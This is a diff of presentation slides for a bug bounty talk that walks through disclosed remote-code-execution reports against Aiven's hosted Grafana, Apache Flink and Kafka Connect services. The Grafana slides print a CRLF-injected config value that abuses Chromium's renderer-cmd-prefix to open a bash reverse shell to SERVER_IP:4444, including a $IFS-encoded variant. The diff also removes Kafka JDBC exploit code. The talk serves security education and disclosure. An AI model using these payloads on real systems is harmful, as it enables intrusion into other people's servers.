@@ -36,14 +36,17 @@ layout: intro
 
 - About Bug Bounties
 - Aiven Bug Bounty program
-- My approach for huntings bugs through few examples
+- Step-by-step explanation of a few bug bounty reports
 
 ---
 
 # What are Bug Bounties?
 
-- Hackers rewarded for discovering security issues
-- Reward based on impact
+- Hackers rewarded for discovering and reporting exploitable security issues in the bug bounty program in-scope assets
+- Companies can create bug bounty programs for their assets on a managed platform (e.g, HackerOne, Intigriti) or create their own bug bounty platform (Google, Microsoft)
+
+<img src="img/hackerone_logo_black.png" style="height: 100px;position:absolute;top: 350px;right:50px"/>
+<img src="img/intigriti-full-logo-black.svg" style="height: 100px;position:absolute;top: 250px;right:500px;"/>
 
 ---
 
@@ -86,7 +89,7 @@ layout: intro
 
 ---
 
-# Grafana RCE (1)
+# Grafana RCE
 
 
 <img src="img/grafana_aiven_config.png" style="height:400px"/>
@@ -101,7 +104,7 @@ layout: intro
 
 ---
 
-# Grafana RCE (2)
+# Grafana RCE
 
 - Let's look at the Grafana documentation
 <img src="img/grafana_doc1.png"/>
@@ -114,7 +117,7 @@ layout: intro
 
 ---
 
-# Grafana RCE (3)
+# Grafana RCE
 
 - Supports configuration via grafana.ini file:
 
@@ -142,7 +145,7 @@ protocol = http
 
 ---
 
-# Grafana RCE (3)
+# Grafana RCE
 
 - Likely Aiven creates grafana.ini dynamically from user input
 
@@ -154,7 +157,7 @@ protocol = http
 
 ---
 
-# Grafana RCE (4)
+# Grafana RCE
 
 - Q1: Can we edit unsupported configuration options by injecting newline characters?
 - Q2: How this could be escalated to Remote Command Execution (RCE)?
@@ -167,7 +170,7 @@ protocol = http
 
 ---
 
-# Grafana RCE (5) - Q1
+# Grafana RCE
 
 - Testing for CRLF injection (\r\n) AKA newline injection
 - Searched Aiven Github repositories in case something interesting was there
@@ -183,7 +186,7 @@ protocol = http
 
 ---
 
-# Grafana RCE (6) - Q1
+# Grafana RCE - Q1
 
 Example input validation entry:
 ```json
@@ -207,7 +210,7 @@ Example input validation entry:
 
 ---
 
-# Grafana RCE (7) - Q1
+# Grafana RCE - Q1
 
 SMTP server parameters missing regex validation. CRLF injection possible!!!
 
@@ -243,7 +246,7 @@ SMTP server parameters missing regex validation. CRLF injection possible!!!
 
 ---
 
-# Grafana RCE (x)
+# Grafana RCE
 
 - Q1: Can we edit unsupported configuration options by injecting newline characters? ✅
 - <b>Q2: How this could be escalated to Remote Command Execution (RCE)?</b>
@@ -257,7 +260,7 @@ SMTP server parameters missing regex validation. CRLF injection possible!!!
 
 ---
 
-# Grafana RCE (7) - Q2
+# Grafana RCE - Q2
 
 <img src="img/grafana_rendering1.png"/>
 
@@ -269,7 +272,7 @@ SMTP server parameters missing regex validation. CRLF injection possible!!!
 
 ---
 
-# Grafana RCE (8) - Q2
+# Grafana RCE - Q2
 
 <img src="img/grafana_rendering2.png"/>
 
@@ -282,7 +285,7 @@ SMTP server parameters missing regex validation. CRLF injection possible!!!
 
 ---
 
-# Grafana RCE (x)
+# Grafana RCE
 
 - <https://peter.sh/experiments/chromium-command-line-switches/>:
 <img src="img/grafana_rendering3.png"/>
@@ -296,7 +299,7 @@ SMTP server parameters missing regex validation. CRLF injection possible!!!
 
 ---
 
-# Grafana RCE (x)
+# Grafana RCE
 
 - Verified that it works on local Grafana instance
 - How to establish reverse shell:
@@ -313,7 +316,7 @@ rendering_args=--renderer-cmd-prefix=bash -c bash -l > /dev/tcp/SERVER_IP/4444 0
 
 ---
 
-# Grafana RCE (9)
+# Grafana RCE
 
 - For some reason, could not pass white spaces, had to encode spaces using "$IFS"
 - IFS env variable - Internal Field Seperator - can be used as space substitute
@@ -331,7 +334,7 @@ rendering_args=--renderer-cmd-prefix=bash$IFS-l$IFS>$IFS/dev/tcp/SERVER_IP/4444$
 
 ---
 
-# Grafana RCE (9)
+# Grafana RCE
 
 ```http
 PUT /v1/project/PROJECT_NAME/service/GRAFANA_INSTANCE_NAME HTTP/1.1
@@ -362,7 +365,33 @@ Content-Type: application/json
 
 ---
 
-# Grafana RCE (10)
+# Grafana RCE
+
+- https://hackerone.com/reports/1200647
+
+<BarBottom title="hackerone.com/reports/1200647">
+  <Item text="@JJaaskela">
+    <carbon:logo-twitter />
+  </Item>
+</BarBottom>
+
+---
+
+# Grafana RCE
+
+<video>
+<source src="videos/flink.mp4" type="video/mp4">
+</video>
+
+<BarBottom title="hackerone.com/reports/1418891">
+  <Item text="@JJaaskela">
+    <carbon:logo-twitter />
+  </Item>
+</BarBottom>
+
+---
+
+# Grafana RCE
 
 <img src="img/report_grafana_reward.png"/>
 
@@ -421,7 +450,7 @@ Content-Type: application/json
 
 ---
 
-# Apache Flink RCE (2)
+# Apache Flink RCE
 
 Apache Flink Rest API documentation:
 
@@ -550,6 +579,32 @@ Authorization: Basic █████
   </Item>
 </BarBottom>
 
+---
+
+# Apache Flink RCE
+
+- https://hackerone.com/reports/1418891
+- https://github.com/Jarijaas/helsec-1103/blob/master/pocs/flink.py
+
+<BarBottom title="hackerone.com/reports/1418891">
+  <Item text="@JJaaskela">
+    <carbon:logo-twitter />
+  </Item>
+</BarBottom>
+
+---
+
+# Apache Flink RCE
+
+<video>
+<source src="videos/flink.mp4" type="video/mp4">
+</video>
+
+<BarBottom title="hackerone.com/reports/1418891">
+  <Item text="@JJaaskela">
+    <carbon:logo-twitter />
+  </Item>
+</BarBottom>
 
 ---
 
@@ -562,18 +617,6 @@ Authorization: Basic █████
     <carbon:logo-twitter />
   </Item>
 </BarBottom>
-
-<!--
-# Apache Flink RCE
-
-- GET /jars/:jarId/plan was removed in Flink 1.16 (28 Oct 2022) release
-
-<BarBottom title="hackerone.com/reports/1418891">
-  <Item text="@JJaaskela">
-    <carbon:logo-twitter />
-  </Item>
-</BarBottom>
--->
 
 ---
 
@@ -727,55 +770,10 @@ jdbc:sqlite:/tmp/test.db
 
 ---
 
- # Kafka Connect RCE - JDBC SQLite config
+# Kafka Connect RCE
 
- ```python
-connector_url = f"{kafka_connect_api_baseurl}/connectors/{connector_name}"
-
-payload = json.dumps({
-  "connector.class": "io.aiven.connect.jdbc.JdbcSinkConnector",
-  "connection.url": f"jdbc:sqlite:/tmp/test.db",
-  "name":connector_name,
-  "topics": topic_name,
-  "key.converter": "org.apache.kafka.connect.storage.StringConverter",
-  "value.converter": "org.apache.kafka.connect.json.JsonConverter",
-  "value.converter.schemas.enable": "true",
-  "auto.create": "true" # Create tables automatically
-})
-headers = {
-    'Content-Type': 'application/json'
-}
-requests.request("PUT", f"{connector_url}/config", headers=headers, data=payload, auth=(kafka_user, kafka_password))
- ```
-
- <BarBottom title="hackerone.com/reports/1547877">
-  <Item text="@JJaaskela">
-    <carbon:logo-twitter />
-  </Item>
-</BarBottom>
-
----
-
-# Kafka Connect RCE - JDBC SQLite Kafka topic message
-
- ```python
-producer.send(topic_name, json.dumps(
-  {
-  "schema": {
-      "type": "struct",
-      "fields": [{
-          "field": "payload",
-          "type": "bytes",
-          "optional": False
-      }]
-  },
-  "payload": {
-      # JsonConverter uses com.fasterxml.jackson, which supports binary values as base64 encoded string
-      "payload": base64.b64encode(jar_contents).decode('utf-8') 
-  }
-  }
-).encode('utf-8'))
- ```
+- https://hackerone.com/reports/1547877
+- https://github.com/Jarijaas/helsec-1103/blob/master/pocs/jdbc.py
 
 <BarBottom title="hackerone.com/reports/1547877">
   <Item text="@JJaaskela">
@@ -811,9 +809,12 @@ producer.send(topic_name, json.dumps(
 
 ---
 
-# That's it
+# Thank you!
 
 - Any questions?
+- Slides + PoC scripts: [^1]
+
+[^1]: https://github.com/Jarijaas/helsec-1103
 
 <BarBottom title="Thank you!">
   <Item text="@JJaaskela">
